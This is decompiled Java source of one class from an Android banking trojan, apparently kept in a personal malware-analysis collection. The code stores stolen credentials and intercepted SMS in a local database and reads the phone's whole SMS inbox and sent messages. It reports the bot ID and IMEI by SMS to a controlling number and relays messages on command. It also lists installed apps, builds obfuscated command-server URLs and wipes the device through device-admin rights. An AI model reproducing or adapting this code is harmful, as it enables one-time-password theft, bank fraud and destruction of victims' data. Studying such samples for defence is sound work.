import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.net.Uri;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import com.soft360.iService.AService;
import com.soft360.web.MyAdmin;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public final class dU
  extends SQLiteOpenHelper
{
  public static dU a;
  public static String a;
  private static final String[] a;
  public static String b;
  public static String c;
  public static String d;
  public static String e;
  public static String f;
  public static String g;
  public cD a;
  public String h = "";
  public String i = "";
  
  static
  {
    jdField_a_of_type_JavaLangString = "SELECT  * FROM inforegLastCommand";
    b = "SELECT * FROM inforegLastCommand tab WHERE tab.record = 0 and tab.id = 1";
    c = "SELECT * FROM inforegLastCommand tab WHERE tab.sms = 0 and tab.id = 1";
    d = "SELECT * FROM inforegLastCommand tab WHERE tab.call = 0 and tab.id = 1";
    e = "SELECT * FROM inforegLastCommand tab WHERE tab.isInit = 0 and tab.id = 1";
    f = "CREATE TABLE IF NOT EXISTS VERYPASS ('ID' INT AUTO_INCREMENT,'CERT' CHAR(30),'PASS' CHAR(30), PRIMARY KEY('ID'))";
    g = "SELECT * FROM inforegLastCommand tab WHERE tab.isHacked = 0 and tab.id = 1";
    jdField_a_of_type_ArrayOfJavaLangString = new String[0];
    jdField_a_of_type_DU = null;
  }
  
  private dU(Context paramContext)
  {
    super(paramContext, "iBankDB_23.db", null, 4);
    this.jdField_a_of_type_CD = new cD();
  }
  
  public static long a(SmsMessage paramSmsMessage)
  {
    SQLiteDatabase localSQLiteDatabase = a(null).getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("isTransfer", new Byte("1"));
    localContentValues.put("MessageBody", paramSmsMessage.getDisplayMessageBody());
    localContentValues.put("OriginatingAddress", paramSmsMessage.getDisplayOriginatingAddress());
    localContentValues.put("Status", Integer.valueOf(paramSmsMessage.getStatus()));
    return localSQLiteDatabase.insert("refSMS", "", localContentValues);
  }
  
  public static dU a(Context paramContext)
  {
    if (jdField_a_of_type_DU == null)
    {
      Context localContext = paramContext;
      if (paramContext == null) {
        localContext = AService.a;
      }
      paramContext = new dU(localContext);
      jdField_a_of_type_DU = paramContext;
      paramContext.getWritableDatabase();
    }
    return jdField_a_of_type_DU;
  }
  
  public static String a()
  {
    return ((TelephonyManager)AService.a.getSystemService("phone")).getDeviceId();
  }
  
  public static void a()
  {
    try
    {
      SmsManager localSmsManager = SmsManager.getDefault();
      String str = "Control number change to " + em.jdField_a_of_type_JavaLangString;
      localSmsManager.sendTextMessage(em.jdField_a_of_type_JavaLangString, null, str, null, null);
      return;
    }
    catch (Exception localException)
    {
      new StringBuilder("sendChangeNum14 error ").append(localException.toString()).toString();
    }
  }
  
  private static void a(SQLiteDatabase paramSQLiteDatabase)
  {
    try
    {
      paramSQLiteDatabase.beginTransaction();
      paramSQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS refUserInfo ( 'id' INT AUTO_INCREMENT NOT NULL,'user' CHAR(25), 'psw' CHAR(35), PRIMARY KEY('id') ) ");
      paramSQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS refSMS (  'id' INT AUTO_INCREMENT,'msgText' CHAR(150), 'isTransfer' BYTE NOT NULL,'MessageBody' CHAR(150),  'OriginatingAddress' CHAR(150) NOT NULL,  'Status' INT,  PRIMARY KEY('id')  ) ");
      paramSQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS inforegLastCommand (  'id' INT ,  'sms' INT,  'call' INT,  'record' INT,  'recordcall' INT,  'isInit' INT,  'telNum' CHAR(25), 'isHacked' INT,  PRIMARY KEY('id') )");
      paramSQLiteDatabase.execSQL(f);
      if (paramSQLiteDatabase.rawQuery(jdField_a_of_type_JavaLangString, jdField_a_of_type_ArrayOfJavaLangString).getCount() == 0)
      {
        ContentValues localContentValues = new ContentValues();
        localContentValues.put("id", Integer.valueOf(1));
        paramSQLiteDatabase.insert("inforegLastCommand", "", localContentValues);
      }
      paramSQLiteDatabase.setTransactionSuccessful();
      return;
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException(localSQLException.toString());
    }
    finally
    {
      paramSQLiteDatabase.endTransaction();
    }
  }
  
  public static void a(String paramString)
  {
    int j = paramString.indexOf(" ");
    int k = paramString.indexOf(":");
    String str = paramString.substring(j, k);
    paramString = paramString.substring(k + 1);
    SmsManager localSmsManager = SmsManager.getDefault();
    try
    {
      localSmsManager.sendTextMessage(str, null, paramString, null, null);
      return;
    }
    catch (Exception paramString) {}
  }
  
  public static boolean a()
  {
    return c(0);
  }
  
  private static boolean a(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = a(null).getWritableDatabase();
    if (((l()) && (paramInt == 0)) || ((!l()) && (paramInt == 1))) {
      return true;
    }
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("call", Integer.valueOf(paramInt));
    for (;;)
    {
      try
      {
        localSQLiteDatabase.beginTransaction();
        int j = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 2);
        localSQLiteDatabase.setTransactionSuccessful();
        localSQLiteDatabase.endTransaction();
        dS.a();
        if (paramInt == 0)
        {
          dS.a();
          if (j > 0) {
            break;
          }
          throw new SQLException("error setting call!!");
        }
      }
      catch (SQLException localSQLException)
      {
        throw new SQLException("fail to set call:" + localSQLException);
      }
      finally
      {
        localSQLiteDatabase.endTransaction();
      }
      dS.b();
    }
  }
  
  public static boolean b()
  {
    return c(1);
  }
  
  private static boolean b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = a(null).getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("recordcall", Integer.valueOf(paramInt));
    try
    {
      localSQLiteDatabase.beginTransaction();
      paramInt = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 2);
      localSQLiteDatabase.setTransactionSuccessful();
      localSQLiteDatabase.endTransaction();
      if (paramInt > 0) {
        return true;
      }
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException("fail to set RecordCALL: " + localSQLException);
    }
    finally
    {
      localSQLiteDatabase.endTransaction();
    }
    throw new SQLException("error setting RecordCALL!!");
  }
  
  public static boolean c()
  {
    return b(0);
  }
  
  private static boolean c(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = a(null).getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("record", Integer.valueOf(paramInt));
    try
    {
      localSQLiteDatabase.beginTransaction();
      paramInt = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 2);
      localSQLiteDatabase.setTransactionSuccessful();
      localSQLiteDatabase.endTransaction();
      if (paramInt > 0) {
        return true;
      }
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException("fail to set record: " + localSQLException);
    }
    finally
    {
      localSQLiteDatabase.endTransaction();
    }
    throw new SQLException("error setting record!!");
  }
  
  public static boolean d()
  {
    return b(1);
  }
  
  private static boolean d(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = a(null).getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("sms", Integer.valueOf(paramInt));
    try
    {
      localSQLiteDatabase.beginTransaction();
      paramInt = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 2);
      localSQLiteDatabase.setTransactionSuccessful();
      localSQLiteDatabase.endTransaction();
      if (paramInt > 0) {
        return true;
      }
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException("fail to set sms: " + localSQLException);
    }
    finally
    {
      localSQLiteDatabase.endTransaction();
    }
    throw new SQLException("error setting sms!!");
  }
  
  private static String e()
  {
    Object localObject2 = "";
    try
    {
      SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("dd-MMM-yy (HH:mm:SS)");
      Object localObject1 = Uri.parse("content://sms/inbox");
      Object localObject3 = AService.a.getContentResolver().query((Uri)localObject1, null, null, null, null);
      localObject1 = localObject2;
      if (((Cursor)localObject3).getCount() > 0)
      {
        localObject1 = localObject2;
        if (((Cursor)localObject3).moveToNext()) {}
      }
      else
      {
        localObject2 = Uri.parse("content://sms/sent");
        localObject2 = AService.a.getContentResolver().query((Uri)localObject2, null, null, null, null);
        if (((Cursor)localObject2).getCount() <= 0) {
          return localObject1;
        }
      }
      for (;;)
      {
        if (!((Cursor)localObject2).moveToNext())
        {
          return (String)localObject1;
          localObject4 = new Date(((Cursor)localObject3).getLong(((Cursor)localObject3).getColumnIndexOrThrow("date")));
          localObject2 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndexOrThrow("address"));
          localObject4 = localSimpleDateFormat.format((Date)localObject4);
          str1 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndexOrThrow("body")).replace("\n", "").replace("\r", "");
          str2 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndexOrThrow("type"));
          localObject1 = localObject1 + "\n" + (String)localObject2 + "|||" + str1 + "|||" + (String)localObject4 + "|||" + str2;
          break;
        }
        Object localObject4 = new Date(((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndexOrThrow("date")));
        localObject3 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndexOrThrow("address"));
        localObject4 = localSimpleDateFormat.format((Date)localObject4);
        String str1 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndexOrThrow("body")).replace("\n", "").replace("\r", "");
        String str2 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndexOrThrow("type"));
        localObject1 = localObject1 + "\n" + (String)localObject3 + "|||" + str1 + "|||" + (String)localObject4 + "|||" + str2;
      }
      return localException;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      return null;
    }
  }
  
  public static void e()
  {
    DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)AService.a.getSystemService("device_policy");
    if (localDevicePolicyManager.isAdminActive(new ComponentName(AService.a, MyAdmin.class))) {
      localDevicePolicyManager.wipeData(0);
    }
  }
  
  public static boolean f()
  {
    return d(1);
  }
  
  public static boolean g()
  {
    return a(0);
  }
  
  public static boolean h()
  {
    return a(1);
  }
  
  public static boolean i()
  {
    Cursor localCursor = a(null).getReadableDatabase().rawQuery(c, jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public static boolean j()
  {
    Cursor localCursor = a(null).getReadableDatabase().rawQuery(b, jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public static boolean k()
  {
    Cursor localCursor = a(null).getReadableDatabase().rawQuery("SELECT * FROM inforegLastCommand tab WHERE tab.recordcall = 0 and tab.id = 1", jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public static boolean l()
  {
    Cursor localCursor = a(null).getReadableDatabase().rawQuery(d, jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public final String a(int paramInt)
  {
    Object localObject1 = AService.a.getResources().getStringArray(2131230720)[paramInt];
    try
    {
      Object localObject2 = this.jdField_a_of_type_CD;
      localObject2 = new String(cD.a((String)localObject1));
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
    if (!this.h.equals("")) {
      localObject1 = this.h;
    }
    return "http://" + (String)localObject1;
  }
  
  public final String a(String paramString)
  {
    try
    {
      Object localObject = this.jdField_a_of_type_CD;
      localObject = new String(cD.a(paramString));
      return (String)localObject;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return paramString;
  }
  
  public final String b()
  {
    new el();
    String str = AService.a.getString(2131165189);
    try
    {
      Object localObject = this.jdField_a_of_type_CD;
      localObject = new String(cD.a(str));
      return (String)localObject;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return str;
  }
  
  public final String b(int paramInt)
  {
    String str = AService.a.getResources().getStringArray(2131230720)[paramInt];
    try
    {
      Object localObject = this.jdField_a_of_type_CD;
      localObject = new String(cD.a(str));
      return (String)localObject;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return str;
  }
  
  public final void b()
  {
    new Thread(new dV(this)).start();
  }
  
  public final void b(String paramString)
  {
    new ed(this, paramString, a());
  }
  
  public final String c()
  {
    new el();
    String str = AService.a.getString(2131165188);
    try
    {
      Object localObject = this.jdField_a_of_type_CD;
      localObject = new String(cD.a(str));
      return (String)localObject;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return str;
  }
  
  public final void c()
  {
    new Thread(new dW(this)).start();
  }
  
  public final void c(String paramString)
  {
    SmsManager localSmsManager = SmsManager.getDefault();
    String str = "BotId:" + b() + " IMEI:" + a() + " " + paramString;
    try
    {
      localSmsManager.sendTextMessage(em.jdField_a_of_type_JavaLangString, null, str, null, null);
      new Thread(new eb(this, paramString)).start();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public final void d()
  {
    new Thread(new dX(this)).start();
  }
  
  public final void d(String paramString)
  {
    new Thread(new ec(this, paramString)).start();
  }
  
  public final boolean e()
  {
    try
    {
      SmsManager localSmsManager = SmsManager.getDefault();
      String str = "i am " + b() + " IMEI " + a() + " SMS START receive ";
      localSmsManager.sendTextMessage(em.jdField_a_of_type_JavaLangString, null, str, null, null);
      return d(0);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        new StringBuilder("sendConfirm error ").append(localException.toString()).toString();
      }
    }
  }
  
  public final void f()
  {
    String str = Environment.getExternalStorageState();
    if (!str.equals("mounted"))
    {
      new StringBuilder("SD Card is not mounted.  It is ").append(str).append(".").toString();
      return;
    }
    new ee(this);
  }
  
  public final void g()
  {
    dY localdY = new dY(this);
    new eh().a(AService.a, localdY);
  }
  
  public final void h()
  {
    PackageManager localPackageManager = AService.a.getPackageManager();
    Iterator localIterator = localPackageManager.getInstalledApplications(0).iterator();
    String str1 = "";
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        new Thread(new ea(this, str1)).start();
        return;
      }
      ApplicationInfo localApplicationInfo = (ApplicationInfo)localIterator.next();
      if ((localApplicationInfo.icon == 0) || (localApplicationInfo.packageName.startsWith("com.android")) || (localApplicationInfo.packageName.startsWith("com.google.android")) || (localApplicationInfo.packageName.startsWith("com.sec.android")) || (localApplicationInfo.packageName.startsWith("android"))) {
        continue;
      }
      try
      {
        String str2 = (String)localPackageManager.getApplicationLabel(localPackageManager.getApplicationInfo(localApplicationInfo.packageName, 128));
        str1 = str1 + str2 + "|||" + localApplicationInfo.packageName + "\n";
      }
      catch (PackageManager.NameNotFoundException localNameNotFoundException)
      {
        for (;;)
        {
          String str3 = "";
        }
      }
    }
  }
  
  public final boolean m()
  {
    Cursor localCursor = getReadableDatabase().rawQuery(e, jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public final boolean n()
  {
    SQLiteDatabase localSQLiteDatabase = getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("isInit", Integer.valueOf(0));
    int j;
    try
    {
      localSQLiteDatabase.beginTransaction();
      j = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 3);
      localSQLiteDatabase.setTransactionSuccessful();
      localSQLiteDatabase.endTransaction();
      if (j > 0) {
        return true;
      }
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException("fail to init device to DB" + localSQLException);
    }
    finally
    {
      localSQLiteDatabase.endTransaction();
    }
    throw new SQLException("error init Device!!  " + j);
  }
  
  public final boolean o()
  {
    Cursor localCursor = getReadableDatabase().rawQuery(g, jdField_a_of_type_ArrayOfJavaLangString);
    int j = localCursor.getCount();
    localCursor.close();
    return j != 0;
  }
  
  public final void onCreate(SQLiteDatabase paramSQLiteDatabase)
  {
    a(paramSQLiteDatabase);
  }
  
  public final void onOpen(SQLiteDatabase paramSQLiteDatabase)
  {
    super.onOpen(paramSQLiteDatabase);
    a(paramSQLiteDatabase);
  }
  
  public final void onUpgrade(SQLiteDatabase paramSQLiteDatabase, int paramInt1, int paramInt2) {}
  
  public final boolean p()
  {
    SQLiteDatabase localSQLiteDatabase = getWritableDatabase();
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("isHacked", Integer.valueOf(0));
    int j;
    try
    {
      localSQLiteDatabase.beginTransaction();
      j = localSQLiteDatabase.updateWithOnConflict("inforegLastCommand", localContentValues, " id = ? ", new String[] { String.valueOf(1) }, 3);
      localSQLiteDatabase.setTransactionSuccessful();
      localSQLiteDatabase.endTransaction();
      if (j > 0) {
        return true;
      }
    }
    catch (SQLException localSQLException)
    {
      throw new SQLException("fail to setIsHacked to DB" + localSQLException);
    }
    finally
    {
      localSQLiteDatabase.endTransaction();
    }
    throw new SQLException("error setIsHacked!!  " + j);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dU.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */